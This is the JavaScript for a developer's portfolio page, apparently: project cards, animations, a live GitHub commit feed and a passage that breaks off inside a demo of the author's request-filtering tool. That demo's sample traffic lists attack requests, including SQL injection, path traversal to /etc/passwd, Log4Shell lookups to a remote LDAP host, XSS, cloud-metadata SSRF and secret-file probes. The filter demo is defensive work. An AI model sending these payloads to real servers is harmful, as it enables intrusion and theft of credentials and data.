// alex-aero.com — v3
import { SNAPSHOT } from "./snapshot.js?v=3.0.0";

const $ = (s, el = document) => el.querySelector(s);
const $$ = (s, el = document) => [...el.querySelectorAll(s)];
const h = (tag, props = {}, ...kids) => {
  const el = document.createElement(tag);
  for (const [k, v] of Object.entries(props)) {
    if (k === "class") el.className = v;
    else if (k === "style") el.style.cssText = v;
    else if (k.startsWith("on")) el.addEventListener(k.slice(2), v);
    else el.setAttribute(k, v);
  }
  for (const kid of kids.flat()) if (kid != null) el.append(kid.nodeType ? kid : document.createTextNode(kid));
  return el;
};
const svg = (tag, attrs = {}) => {
  const el = document.createElementNS("http://www.w3.org/2000/svg", tag);
  for (const [k, v] of Object.entries(attrs)) el.setAttribute(k, v);
  return el;
};
const REDUCED = matchMedia("(prefers-reduced-motion: reduce)").matches;
const FINE = matchMedia("(pointer: fine)").matches;
const rand = (a, b) => a + Math.random() * (b - a);
const pick = (a) => a[(Math.random() * a.length) | 0];

function ago(iso) {
  const s = Math.max(0, (Date.now() - new Date(iso)) / 1000);
  if (s < 60) return "just now";
  if (s < 3600) return `${(s / 60) | 0}m ago`;
  if (s < 86400) return `${(s / 3600) | 0}h ago`;
  if (s < 86400 * 30) return `${(s / 86400) | 0}d ago`;
  if (s < 86400 * 365) return `${(s / 86400 / 30) | 0}mo ago`;
  return `${(s / 86400 / 365) | 0}y ago`;
}
// "2.39.0: another port…" / "selfmail 2.4.4: …" -> ["2.39.0", "another port…"]
function splitVersion(msg) {
  const m = /^(?:[\w-]+ )?v?(\d+\.\d+\.\d+)\s*[:—-]\s*(.*)$/.exec(msg);
  return m ? [m[1], m[2]] : [null, msg];
}

/* ───────────── projects ───────────── */
const I = {
  shield: '<path d="M12 3 20 6v6c0 5-3.5 8-8 9.5C7.5 20 4 17 4 12V6z"/><path d="m9 12 2 2 4-4"/>',
  gate: '<rect x="4" y="10" width="16" height="11" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/><circle cx="12" cy="15.5" r="1.5"/>',
  desk: '<rect x="3" y="4" width="18" height="12" rx="2"/><path d="M8 20h8M12 16v4"/><path d="m7 8 2 2-2 2M11 12h4"/>',
  pages: '<path d="M6 3h8l4 4v14H6z"/><path d="M14 3v4h4M9 12h6M9 16h6"/>',
  mail: '<rect x="3" y="5" width="18" height="14" rx="2"/><path d="m3 7 9 6 9-6"/>',
  weft: '<path d="M3 8c3-3 6 3 9 0s6 3 9 0M3 16c3-3 6 3 9 0s6 3 9 0"/><path d="M8 3v18M16 3v18" opacity=".45"/>',
  bolt: '<path d="M13 2 4 14h7l-1 8 9-12h-7z"/>',
  sync: '<path d="M20 11a8 8 0 0 0-14.3-4.9L4 8M4 4v4h4M4 13a8 8 0 0 0 14.3 4.9L20 16M20 20v-4h-4"/>',
  cloud: '<path d="M7 18a5 5 0 1 1 .9-9.9A6 6 0 0 1 19 10a4 4 0 0 1-1 8z"/>',
  film: '<rect x="3" y="4" width="18" height="16" rx="2"/><path d="M7 4v16M17 4v16M3 9h4M3 15h4M17 9h4M17 15h4"/>',
  cube: '<path d="m12 3 8 4.5v9L12 21l-8-4.5v-9z"/><path d="m4 7.5 8 4.5 8-4.5M12 12v9"/>',
  plus: '<circle cx="12" cy="12" r="9"/><path d="M12 8v8M8 12h8"/>',
};
const P = {
  "aegis-burrow": { name: "Aegis × Burrow", c: "#3ddc97", ico: "gate", owner: "alexd-aero",
    line: "A post-quantum login in front of everything you run, on a tunnel engine that gives any port its own HTTPS address." },
  bulwark: { name: "Bulwark", c: "#ff5a3d", ico: "shield", owner: "alexd-aero",
    line: "Judges every request in microseconds: 21 attack categories, 44 CVEs, waves seen coming, attackers banned on every tunnel at once." },
  "animated-fiesta": { name: "Selkies Forge", c: "#5aa6ff", ico: "desk", owner: "adatskov-wcpss", wide: true,
    desc: "Turns any Linux machine, even a Raspberry Pi, into a launch pad for full Linux desktops that run in your browser. Ubuntu with Xfce, Fedora with KDE, Kali, Arch with i3, or any of 150 others: it downloads or builds the desktop, starts it in Docker, checks it really works, and hands you a link. GPU passthrough, IPv6, addons, themes. One file, nothing to configure.",
    tags: ["153 desktops", "Python stdlib", "Docker", "arm64 + x86_64"],
    line: "153 Linux desktops, started in Docker and streamed to a browser tab. The other host Weft runs in." },
  "burrow-pages": { name: "Burrow Pages", c: "#ffb36b", ico: "pages", owner: "alexd-aero",
    desc: "Your GitHub or GitLab repos, an upload, or a site that lives elsewhere, on your own subdomain behind a password. Every push goes live, any deploy is one click from live again, and analytics need no cookies.",
    tags: ["Aegis addon", "short links", "ports"],
    line: "Static sites from your repos on your own addresses. Built as a Burrow extension." },
  selfmail: { name: "selfmail", c: "#4fc3f7", ico: "mail", owner: "alexd-aero",
    desc: "A real mail server with a modern webmail app, for home servers that can't open port 25. Postfix and DKIM in one script, DNS set up through Cloudflare, a command palette, undo send, every domain you own in one inbox.",
    tags: ["Postfix", "DKIM", "Cloudflare DNS"],
    line: "A mail server for your own domain. Announces an alerts API on the Weft mesh, so Bulwark can email you." },
  weft: { name: "Weft", c: "#c9b8ff", ico: "weft", owner: "alexd-aero",
    desc: "One addon format for every host I build: a manifest and five bash scripts that install, update and report in Selkies Forge and Aegis × Burrow alike. Comes with a validator, a stand-in host, and a strict brief for AI agents.",
    tags: ["spec 1", "bash", "zero deps"],
    line: "The thread through all of it: one addon format, and a mesh where running addons find each other." },
  "alex-aero-workers": { name: "Alex·Aero Workers", c: "#ecdcbf", ico: "bolt", owner: "alexd-aero", wide: true,
    desc: "Cloudflare Workers on your own machine. Write JavaScript, TypeScript, Python, Shell or plain HTML in the browser, press save, and it's live. JS and TS run in workerd, Cloudflare's own runtime, with KV, cron handlers, versions with one-click rollback, live logs and real metrics. Onto your own domain through a tunnel, without opening a port.",
    tags: ["workerd", "KV + cron", "Docker", "arm64 + x86_64"] },
  "termix-autoupdate": { name: "termix-autoupdate", c: "#9ab8ff", ico: "sync", owner: "alexd-aero",
    desc: "Keeps a Docker Termix, its BG Shell and Updater plugins, and Aegis × Burrow up to date by themselves. Finds every Termix on a machine by what it is, not what it's called.",
    tags: ["Termix plugins", "systemd timer"],
    line: "Keeps Termix, its plugins and Aegis × Burrow updated on their own, daily." },
  "onedrive-api": { name: "OneDrive Explorer", c: "#7fd1c7", ico: "cloud", owner: "alexd-aero",
    desc: "A single-file Flask OneDrive explorer: device-code sign-in inside the app, zero-egress streaming straight from Microsoft's CDN, an Ace editor and custom media players.",
    tags: ["Flask", "single file"] },
  "kinogo-stremio": { name: "Kinogo for Stremio", c: "#f48fb1", ico: "film", owner: "alexd-aero", href: "https://kinogo-stremio.vercel.app",
    desc: "A Stremio addon for Russian films and series: search, genre catalogs, series detected by themselves, and streams resolved from several sources.",
    tags: ["Stremio", "Vercel"] },
  "microvm-playground": { name: "MicroVM Playground", c: "#b0e57c", ico: "cube", owner: "alexd-aero",
    desc: "Disposable Linux playgrounds with a real terminal in the browser. Container, Firecracker and QEMU backends, and it runs in GitHub Codespaces with millisecond startup.",
    tags: ["Firecracker", "QEMU", "Codespaces"] },
};
const repoUrl = (id) => `https://github.com/${P[id]?.owner || "alexd-aero"}/${id}`;
const WORK = ["animated-fiesta", "burrow-pages", "selfmail", "weft", "termix-autoupdate", "alex-aero-workers", "onedrive-api", "kinogo-stremio", "microvm-playground"];
const COMMIT_REPOS = ["aegis-burrow", "bulwark", "animated-fiesta", "burrow-pages", "selfmail", "weft", "alex-aero-workers", "termix-autoupdate"];

/* ───────────── small things ───────────── */
function nav() {
  const bar = $("#nav");
  const onScroll = () => bar.classList.toggle("solid", scrollY > 40);
  addEventListener("scroll", onScroll, { passive: true });
  onScroll();
  const links = new Map($$(".nav-links a").map((a) => [a.getAttribute("href").slice(1), a]));
  const io = new IntersectionObserver((es) => {
    for (const e of es) if (e.isIntersecting) for (const [id, a] of links) a.classList.toggle("on", id === e.target.id);
  }, { rootMargin: "-45% 0px -50% 0px" });
  for (const id of links.keys()) { const s = document.getElementById(id); if (s) io.observe(s); }
}

function spotlight() {
  if (!FINE || REDUCED) return;
  const root = document.documentElement;
  addEventListener("pointermove", (e) => { root.style.setProperty("--sx", e.clientX + "px"); root.style.setProperty("--sy", e.clientY + "px"); }, { passive: true });
}

function reveal() {
  const io = new IntersectionObserver((es) => {
    for (const e of es) if (e.isIntersecting) { e.target.classList.add("in"); io.unobserve(e.target); }
  }, { rootMargin: "0px 0px -8% 0px" });
  const groups = new Map();
  for (const el of $$(".reveal")) {
    const p = el.parentElement;
    const i = groups.get(p) || 0;
    groups.set(p, i + 1);
    el.style.setProperty("--rd", Math.min(i, 6) * 0.07 + "s");
    io.observe(el);
  }
}

function typer() {
  const el = $("#typer");
  const words = ["tunnels", "shields", "a post-quantum login", "desktops in a tab", "mail servers", "an addon format", "things that update themselves"];
  if (REDUCED) return;
  let w = 0, i = words[0].length, del = true;
  const tick = () => {
    const word = words[w];
    if (del) {
      i--; el.textContent = word.slice(0, i);
      if (i <= 0) { del = false; w = (w + 1) % words.length; }
      setTimeout(tick, 32);
    } else {
      const next = words[w];
      i++; el.textContent = next.slice(0, i);
      if (i >= next.length) { del = true; setTimeout(tick, 2200); } else setTimeout(tick, 55 + Math.random() * 60);
    }
  };
  setTimeout(tick, 2400);
}

function countUp() {
  for (const el of $$(".count")) {
    const to = +el.dataset.to;
    if (REDUCED || !to) continue;
    const t0 = performance.now() + 700, dur = 1400;
    el.textContent = "0";
    const step = (t) => {
      const k = Math.min(1, Math.max(0, (t - t0) / dur));
      el.textContent = Math.round(to * (1 - Math.pow(1 - k, 4)));
      if (k < 1) requestAnimationFrame(step);
    };
    requestAnimationFrame(step);
  }
}

function magnets() {
  if (!FINE || REDUCED) return;
  for (const el of $$(".mag")) {
    el.addEventListener("pointermove", (e) => {
      const r = el.getBoundingClientRect();
      el.style.transform = `translate(${(e.clientX - r.left - r.width / 2) * 0.22}px, ${(e.clientY - r.top - r.height / 2) * 0.3}px)`;
    });
    el.addEventListener("pointerleave", () => { el.style.transform = ""; });
  }
}

function copyButtons() {
  for (const b of $$(".copy")) {
    b.addEventListener("click", async () => {
      const text = document.getElementById(b.dataset.copy).textContent.trim();
      try { await navigator.clipboard.writeText(text); b.textContent = "copied"; b.classList.add("done"); }
      catch { const r = document.createRange(); r.selectNodeContents(document.getElementById(b.dataset.copy)); getSelection().removeAllRanges(); getSelection().addRange(r); b.textContent = "select + ⌘C"; }
      setTimeout(() => { b.textContent = "copy"; b.classList.remove("done"); }, 1800);
    });
  }
}

// run fn(dt, t) every frame while el is on screen and the tab is visible
function whileVisible(el, fn) {
  let on = false, raf = 0, last = 0;
  const loop = (t) => { fn(Math.min(64, t - (last || t)), t); last = t; raf = requestAnimationFrame(loop); };
  const set = (v) => {
    if (v === on) return;
    on = v;
    if (on) { last = 0; raf = requestAnimationFrame(loop); } else cancelAnimationFrame(raf);
  };
  let seen = false;
  new IntersectionObserver(([e]) => { seen = e.isIntersecting; set(seen && !document.hidden); }).observe(el);
  document.addEventListener("visibilitychange", () => set(seen && !document.hidden));
}

/* ───────────── the loom (hero) ───────────── */
function loom() {
  const cv = $("#loom"), ctx = cv.getContext("2d");
  let W = 0, H = 0, threads = [], packets = [];
  const mouse = { x: -9999, y: -9999, tx: -9999, ty: -9999 };
  const ACC = ["214,180,92", "61,220,151", "255,90,61", "201,184,255", "90,166,255"];
  function build() {
    const dpr = Math.min(devicePixelRatio || 1, 2);
    W = cv.clientWidth; H = cv.clientHeight;
    cv.width = W * dpr; cv.height = H * dpr;
    ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
    const n = Math.max(14, Math.min(36, Math.round(H / 24)));
    threads = [];
    for (let i = 0; i < n; i++) {
      const accent = i % 4 === 1 ? ACC[(i >> 2) % ACC.length] : null;
      threads.push({ y0: H * (i + 0.5) / n, amp: rand(6, 22), f: rand(0.0016, 0.0042), s: rand(0.25, 0.8) * (i % 2 ? 1 : -1), ph: rand(0, 6.28), accent, a: accent ? 0.22 : rand(0.045, 0.1) });
    }
    packets = threads.filter((t) => t.accent).flatMap((t) => [0, 1].map(() => ({ t, x: rand(-200, W), v: rand(0.05, 0.16) * (W / 1200 + 0.5) })));
  }
  const yAt = (th, x, t) => {
    let y = th.y0 + th.amp * Math.sin(x * th.f + t * 0.00055 * th.s + th.ph) + th.amp * 0.4 * Math.sin(x * th.f * 2.7 - t * 0.0004 * th.s);
    const dx = x - mouse.x, dy = y - mouse.y, d2 = dx * dx + dy * dy;
    if (d2 < 60000) y += Math.exp(-d2 / 14000) * 46 * (dy >= 0 ? 1 : -1);
    return y;
  };
  function draw(dt, t) {
    mouse.x += (mouse.tx - mouse.x) * 0.08; mouse.y += (mouse.ty - mouse.y) * 0.08;
    ctx.clearRect(0, 0, W, H);
    // warp: the threads that stay put
    ctx.strokeStyle = "rgba(255,255,255,.028)"; ctx.lineWidth = 1;
    ctx.beginPath();
    for (let x = 32; x < W; x += 56) { ctx.moveTo(x + 0.5, 0); ctx.lineTo(x + 0.5, H); }
    ctx.stroke();
    // weft: the threads that run across
    const step = W > 900 ? 14 : 10;
    for (const th of threads) {
      ctx.beginPath();
      for (let x = -10; x <= W + 10; x += step) { const y = yAt(th, x, t); x < 0 ? ctx.moveTo(x, y) : ctx.lineTo(x, y); }
      ctx.strokeStyle = th.accent ? `rgba(${th.accent},${th.a})` : `rgba(236,231,222,${th.a})`;
      ctx.lineWidth = th.accent ? 1.2 : 1;
      ctx.stroke();
    }
    // packets riding the coloured threads
    for (const p of packets) {
      p.x += p.v * dt;
      if (p.x > W + 160) { p.x = -160; p.v = rand(0.05, 0.16) * (W / 1200 + 0.5); }
      const c = p.t.accent, tail = 140;
      const g = ctx.createLinearGradient(p.x - tail, 0, p.x, 0);
      g.addColorStop(0, `rgba(${c},0)`); g.addColorStop(1, `rgba(${c},.9)`);
      ctx.beginPath();
      for (let x = p.x - tail; x <= p.x; x += 8) { const y = yAt(p.t, x, t); x === p.x - tail ? ctx.moveTo(x, y) : ctx.lineTo(x, y); }
      ctx.strokeStyle = g; ctx.lineWidth = 2; ctx.stroke();
      const y = yAt(p.t, p.x, t);
      const rg = ctx.createRadialGradient(p.x, y, 0, p.x, y, 14);
      rg.addColorStop(0, `rgba(${c},.9)`); rg.addColorStop(1, `rgba(${c},0)`);
      ctx.fillStyle = rg; ctx.beginPath(); ctx.arc(p.x, y, 14, 0, 6.283); ctx.fill();
      ctx.fillStyle = "#fff"; ctx.beginPath(); ctx.arc(p.x, y, 1.6, 0, 6.283); ctx.fill();
    }
  }
  build();
  let rt; addEventListener("resize", () => { clearTimeout(rt); rt = setTimeout(() => { build(); if (REDUCED) draw(0, 0); }, 120); });
  if (FINE) {
    cv.parentElement.addEventListener("pointermove", (e) => { const r = cv.getBoundingClientRect(); mouse.tx = e.clientX - r.left; mouse.ty = e.clientY - r.top; });
    cv.parentElement.addEventListener("pointerleave", () => { mouse.tx = mouse.ty = -9999; });
  }
  if (REDUCED) draw(0, 0); else whileVisible(cv, draw);
}

/* ───────────── live from GitHub ───────────── */
const CACHE_KEY = "ax-gh-3", CACHE_MS = 20 * 60 * 1000;
async function github() {
  try {
    const c = JSON.parse(localStorage.getItem(CACHE_KEY) || "null");
    if (c && Date.now() - c.t < CACHE_MS) return { ...c.d, live: true };
  } catch {}
  const get = async (p) => { const r = await fetch("https://api.github.com/" + p, { headers: { Accept: "application/vnd.github+json" } }); if (!r.ok) throw new Error(r.status); return r.json(); };
  const res = await Promise.allSettled([
    get("users/alexd-aero/repos?per_page=100&sort=pushed"),
    ...COMMIT_REPOS.map((id) => get(`repos/${P[id].owner}/${id}/commits?per_page=6`)),
  ]);
  if (res.every((r) => r.status === "rejected")) return { ...SNAPSHOT, live: false };
  const repos = { ...SNAPSHOT.repos };
  if (res[0].status === "fulfilled") for (const r of res[0].value) if (P[r.name]) repos[r.name] = { pushed: r.pushed_at, stars: r.stargazers_count };
  let commits = [];
  res.slice(1).forEach((r, i) => {
    const id = COMMIT_REPOS[i];
    if (r.status !== "fulfilled") { commits.push(...SNAPSHOT.commits.filter((c) => c.repo === id)); return; }
    for (const c of r.value) commits.push({ repo: id, sha: c.sha.slice(0, 7), msg: c.commit.message.split("\n")[0], date: c.commit.author.date });
    if (r.value[0] && (!repos[id] || repos[id].pushed < r.value[0].commit.author.date)) repos[id] = { ...repos[id], pushed: r.value[0].commit.author.date };
  });
  commits.sort((a, b) => (a.date < b.date ? 1 : -1));
  const d = { at: new Date().toISOString(), repos, commits: commits.slice(0, 24) };
  try { localStorage.setItem(CACHE_KEY, JSON.stringify({ t: Date.now(), d })); } catch {}
  return { ...d, live: true };
}

function latestVersions(commits) {
  const v = {};
  for (const c of commits) { if (v[c.repo]) continue; const [ver] = splitVersion(c.msg); if (ver) v[c.repo] = ver; }
  return v;
}

function renderLive(data, first) {
  const vers = latestVersions(data.commits);
  for (const el of $$("[data-ver]")) if (vers[el.dataset.ver]) el.textContent = vers[el.dataset.ver];
  if (vers["aegis-burrow"]) $("#stat-aegis").textContent = vers["aegis-burrow"].split(".").slice(0, 2).join(".");
  const newest = data.commits[0];
  if (newest) $("#nav-live").textContent = `pushed ${ago(newest.date)}`;

  // ticker
  const track = $("#ticker-track");
  const items = data.commits.slice(0, 14).map((c) => {
    const [ver, rest] = splitVersion(c.msg);
    return h("a", { class: "tick", href: `${repoUrl(c.repo)}/commit/${c.sha}`, target: "_blank", rel: "noopener", style: `--c:${P[c.repo]?.c || "var(--gold)"}` },
      h("b", {}, P[c.repo]?.name || c.repo), ver ? `${ver} · ${rest}` : rest);
  });
  track.replaceChildren(...items, ...items.map((n) => { const k = n.cloneNode(true); k.setAttribute("aria-hidden", "true"); k.tabIndex = -1; return k; }));
  requestAnimationFrame(() => track.style.setProperty("--tdur", Math.max(40, track.scrollWidth / 2 / 60) + "s"));

  // shipping log
  const list = $("#commits");
  const prev = new Set($$("li", list).map((li) => li.dataset.sha));
  list.replaceChildren(...data.commits.slice(0, 14).map((c) => {
    const [ver, rest] = splitVersion(c.msg);
    return h("li", { "data-sha": c.sha, class: !first && !prev.has(c.sha) ? "new" : "" },
      h("a", { href: `${repoUrl(c.repo)}/commit/${c.sha}`, target: "_blank", rel: "noopener" },
        h("time", { datetime: c.date, title: new Date(c.date).toLocaleString() }, ago(c.date)),
        h("span", { class: "repo", style: `--c:${P[c.repo]?.c}`, }, P[c.repo]?.name || c.repo),
        h("span", { class: "msg" }, ver ? h("b", {}, ver) : null, rest),
        h("span", { class: "sha" }, c.sha)));
  }));
  $("#log-src").textContent = data.live ? "The newest commits across my projects, live from GitHub." : `The newest commits across my projects (GitHub is resting; as of ${new Date(data.at).toLocaleDateString()}).`;

  // card freshness
  for (const el of $$(".card[data-repo]")) {
    const r = data.repos[el.dataset.repo];
    const meta = $(".card-meta", el);
    if (r?.pushed) {
      const fresh = Date.now() - new Date(r.pushed) < 7 * 86400e3;
      meta.replaceChildren(fresh ? h("span", { class: "fresh" }, "● ") : "", `updated ${ago(r.pushed)}`);
    }
    const v = vers[el.dataset.repo], vb = $(".ver", el);
    if (v && vb) vb.textContent = v;
  }
}

async function live() {
  renderLive({ ...SNAPSHOT, live: false }, true);
  const go = async (first) => { try { renderLive(await github(), first); } catch {} };
  await go(true);
  // keep the relative times and the feed fresh while the page is open
  setInterval(() => { for (const t of $$("#commits time")) t.textContent = ago(t.getAttribute("datetime")); }, 30e3);
  setInterval(() => { if (!document.hidden) go(false); }, CACHE_MS + 5000);
}

/* ───────────── work cards ───────────── */
function cards() {
  const box = $("#cards");
  const make = (id) => {
    const p = P[id];
    const el = h("a", { class: "card reveal" + (p.wide ? " wide" : ""), "data-repo": id, href: p.href || repoUrl(id), target: "_blank", rel: "noopener", style: `--c:${p.c}` });
    el.innerHTML = `<div class="card-top"><span class="card-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">${I[p.ico]}</svg></span><span class="card-meta"></span></div>`;
    el.append(h("h3", {}, p.name, h("span", { class: "ver", style: `--c:${p.c}` })), h("p", {}, p.desc), h("div", { class: "card-tags" }, ...(p.tags || []).map((t) => h("span", {}, t))), h("span", { class: "card-go", "aria-hidden": "true" }, "↗"));
    return el;
  };
  box.append(...WORK.map(make));
  const more = h("a", { class: "card reveal", href: "https://github.com/alexd-aero?tab=repositories", target: "_blank", rel: "noopener", style: "--c:#d6b45c" });
  more.innerHTML = `<div class="card-top"><span class="card-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round">${I.plus}</svg></span><span class="card-meta">github.com/alexd-aero</span></div><h3>And the rest</h3><p>Proxies, Stremio addons, experiments and things I built to learn. All of it on GitHub.</p><span class="card-go" aria-hidden="true">↗</span>`;
  box.append(more);
  if (!FINE || REDUCED) return;
  for (const c of $$(".card", box)) {
    c.addEventListener("pointermove", (e) => {
      const r = c.getBoundingClientRect(), x = e.clientX - r.left, y = e.clientY - r.top;
      c.style.setProperty("--mx", x + "px"); c.style.setProperty("--my", y + "px");
      c.style.setProperty("--rx", ((y / r.height) - 0.5) * -5 + "deg"); c.style.setProperty("--ry", ((x / r.width) - 0.5) * 6 + "deg");
    });
    c.addEventListener("pointerleave", () => { c.style.setProperty("--rx", "0deg"); c.style.setProperty("--ry", "0deg"); });
  }
}

/* ───────────── woven: the graph ───────────── */
function graph() {
  const g = $("#graph"), info = $("#weft-info"), fig = g.parentElement;
  const C = 280, R = 196;
  const N = {
    weft: { x: C, y: C, r: 40, c: "#c9b8ff", name: "Weft", sub: "the format", text: "The thread through all of it. One manifest and five scripts; addons find each other on the mesh." },
  };
  const ring = [
    ["aegis-burrow", "host"], ["bulwark", "addon"], ["animated-fiesta", "host"], ["selfmail", "addon"], ["termix-autoupdate", "keeper"], ["burrow-pages", "addon"],
  ];
  ring.forEach(([id, sub], i) => {
    const a = -Math.PI / 2 + (i * 2 * Math.PI) / ring.length;
    N[id] = { x: C + R * Math.cos(a), y: C + R * Math.sin(a), r: id === "aegis-burrow" || id === "bulwark" ? 36 : 30, c: P[id].c, name: P[id].name.replace("termix-autoupdate", "Termix updater"), sub, text: P[id].line };
  });
  // [a, b, what a does to b, what b does to a]
  const E = [
    ["weft", "aegis-burrow", "runs in", "speaks"], ["weft", "animated-fiesta", "runs in", "speaks"], ["weft", "bulwark", "packages", "is packaged in"],
    ["weft", "selfmail", "carries", "announces itself on"], ["weft", "burrow-pages", "packages", "is packaged in"],
    ["aegis-burrow", "bulwark", "is guarded by", "guards every tunnel of"], ["aegis-burrow", "burrow-pages", "is extended by", "extends"],
    ["aegis-burrow", "animated-fiesta", "is bridged to", "is bridged to"], ["aegis-burrow", "selfmail", "installs", "installs into"],
    ["bulwark", "selfmail", "emails you through", "sends the alerts of"], ["bulwark", "animated-fiesta", "installs into", "can run"],
    ["termix-autoupdate", "aegis-burrow", "keeps updated", "is kept updated by"],
  ];
  const curve = (a, b) => {
    const mx = (a.x + b.x) / 2, my = (a.y + b.y) / 2;
    const k = a === N.weft || b === N.weft ? 0 : 0.28;
    return `M${a.x} ${a.y} Q${mx + (C - mx) * k} ${my + (C - my) * k} ${b.x} ${b.y}`;
  };
  const edges = E.map(([a, b, ab, ba]) => {
    const d = curve(N[a], N[b]);
    const base = svg("path", { d, class: "g-edge", style: `--ec:${N[b].c}` });
    const flow = svg("path", { d, class: "g-flow", stroke: a === "weft" ? N.weft.c : N[a].c, style: `animation-delay:${-Math.random() * 2.4}s` });
    g.append(base, flow);
    return { a, b, ab, ba, base };
  });
  const nodes = {};
  for (const [id, n] of Object.entries(N)) {
    const el = svg("g", { class: "g-node", transform: `translate(${n.x} ${n.y})`, tabindex: "0", role: "button", "aria-label": n.name });
    el.append(svg("circle", { class: "halo", r: n.r + 14, fill: n.c }));
    el.append(svg("circle", { class: "core", r: n.r, fill: "#0d0d12" }));
    el.append(svg("circle", { r: 5, fill: n.c }));
    const up = n.y < C - 100; // the top node is labelled above, away from its edges
    const t = svg("text", { y: up ? -n.r - 27 : n.r + 22 }); t.textContent = n.name;
    const s = svg("text", { y: up ? -n.r - 12 : n.r + 37, class: "sub" }); s.textContent = n.sub;
    el.append(t, s);
    g.append(el);
    nodes[id] = el;
    const on = () => focus(id);
    el.addEventListener("pointerenter", on); el.addEventListener("focus", on); el.addEventListener("click", on);
  }
  function focus(id) {
    fig.classList.add("focus");
    const near = new Set([id]);
    for (const e of edges) { const hit = e.a === id || e.b === id; e.base.classList.toggle("on", hit); if (hit) near.add(e.a === id ? e.b : e.a); }
    for (const [k, el] of Object.entries(nodes)) { el.classList.toggle("on", k === id); el.classList.toggle("near", near.has(k)); }
    const n = N[id];
    const ties = edges.filter((e) => e.a === id || e.b === id).map((e) => e.a === id ? `${e.ab} ${N[e.b].name}` : `${e.ba} ${N[e.a].name}`).slice(0, 4);
    info.style.setProperty("--cc", n.c);
    info.replaceChildren(h("b", {}, n.name), h("span", {}, n.text), h("span", { class: "dim", style: "font-size:13px;margin-top:4px" }, ties.join(" · ")));
  }
  if (!FINE) $("#weft-hint").textContent = "Tap a project to see what it's tied to.";
  fig.addEventListener("pointerleave", () => {
    fig.classList.remove("focus");
    for (const e of edges) e.base.classList.remove("on");
    for (const el of Object.values(nodes)) el.classList.remove("on", "near");
  });
}

/* ───────────── Aegis × Burrow flow ───────────── */
function flow() {
  const s = $("#flow-svg"), layer = $("#flow-dots");
  const path = (id) => s.getElementById ? s.getElementById(id) : $("#" + id);
  const P_IN = path("p-in"), P_BAD = path("p-bad"), OUT = ["p-o1", "p-o2", "p-o3", "p-o4"].map(path);
  const ports = $$(".port", s);
  const live = [];
  let spawnAt = 0;
  const dot = (color, r = 4) => {
    const g = svg("g");
    g.append(svg("circle", { r: r * 3, fill: color, opacity: ".18" }), svg("circle", { r, fill: color }));
    layer.append(g);
    return g;
  };
  function spawn(t) {
    if (Math.random() < 0.3) live.push({ el: dot("#ff5a3d"), legs: [P_BAD], leg: 0, t0: t, dur: 1100, bad: true });
    else { const k = (Math.random() * 4) | 0; live.push({ el: dot("#3ddc97"), legs: [P_IN, OUT[k]], port: k, leg: 0, t0: t, dur: 1000 }); }
  }
  function burst(x, y) {
    const c = svg("circle", { cx: x, cy: y, r: 4, fill: "none", stroke: "#ff5a3d", "stroke-width": 2 });
    layer.append(c);
    c.animate([{ r: 4, opacity: 1 }, { r: 26, opacity: 0 }], { duration: 600, easing: "ease-out" }).onfinish = () => c.remove();
  }
  function step(dt, t) {
    if (t > spawnAt) { spawn(t); spawnAt = t + rand(380, 760); }
    for (let i = live.length - 1; i >= 0; i--) {
      const p = live[i], el = p.legs[p.leg];
      const k = Math.min(1, (t - p.t0) / p.dur), e = k < 0.5 ? 2 * k * k : 1 - Math.pow(-2 * k + 2, 2) / 2;
      const pt = el.getPointAtLength(e * el.getTotalLength());
      p.el.setAttribute("transform", `translate(${pt.x} ${pt.y})`);
      if (k >= 1) {
        if (p.leg + 1 < p.legs.length) { p.leg++; p.t0 = t; continue; }
        if (p.bad) burst(pt.x, pt.y);
        else { const port = ports[p.port]; port.classList.add("hit"); setTimeout(() => port.classList.remove("hit"), 260); }
        p.el.remove(); live.splice(i, 1);
      }
    }
  }
  if (!REDUCED) whileVisible(s, step);
}

/* ───────────── Bulwark, live in the page ───────────── */
const UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36";
const CHIPS = [
  ["SQL injection", "GET", "/?id=1%27%20OR%20%271%27%3D%271"],
  ["../ double-encoded", "GET", "/..%252f..%252f..%252fetc%252fpasswd"],
  ["fullwidth ．．／", "GET", "/．．／．．／etc/passwd"],
  ["Log4Shell", "GET", "/?x=%24%7Bjndi%3Aldap%3A%2F%2F198.51.100.7%2Fa%7D"],
  ["hidden XSS", "GET", "/?q=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E"],
  ["Apache CVE", "GET", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"],
  ["cloud metadata", "GET", "/?u=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"],
  ["/.env", "GET", "/.env"],
  ["O'Reilly", "GET", "/authors?name=O%27Reilly", true],
  ["“select from table”", "GET", "/search?q=how+to+select+from+table+where+id+%3D+1", true],
];
const TRAFFIC = [
  ["GET", "/"], ["GET", "/assets/app.3f9c1e.js"], ["GET", "/api/feed?page=2&limit=20"], ["GET", "/search?q=how+to+select+from+table+where+id+%3D+1"],
  ["GET", "/authors?name=O%27Reilly"], ["GET", "/oauth/callback?code=4%2F0AfJohXk&state=eyJhbGciOiJIUzI1NiJ9.eyJyIjoiLyJ9.sig"], ["GET", "/favicon.ico"],
  ["PROPFIND", "/dav/notes/"], ["GET", "/blog/2026/11/hello-world"], ["POST", "/api/session"], ["GET", "/img/cat.webp?w=640"],
  ["GET", "/.env"], ["GET", "/.git/config"], ["GET", "/wp-login.php"], ["GET", "/?id=1%27%20OR%20%271%27%3D%271"],
  ["GET", "/..%252f..%252f..%252fetc%252fpasswd"], ["GET", "/?x=%24%7Bjndi%3Aldap%3A%2F%2F198.51.100.7%2Fa%7D"],
  ["GET", "/", "${${::-j}${::-n}di:ldap://198.51.100.7/x}"], ["GET", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"],
  ["GET", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"], ["GET", "/?u=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"],
  ["GET", "/?q=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E"], ["GET", "/．．／．．／etc/passwd"], ["GET", "/?n=%7B%7B7*7%7D%7D"],
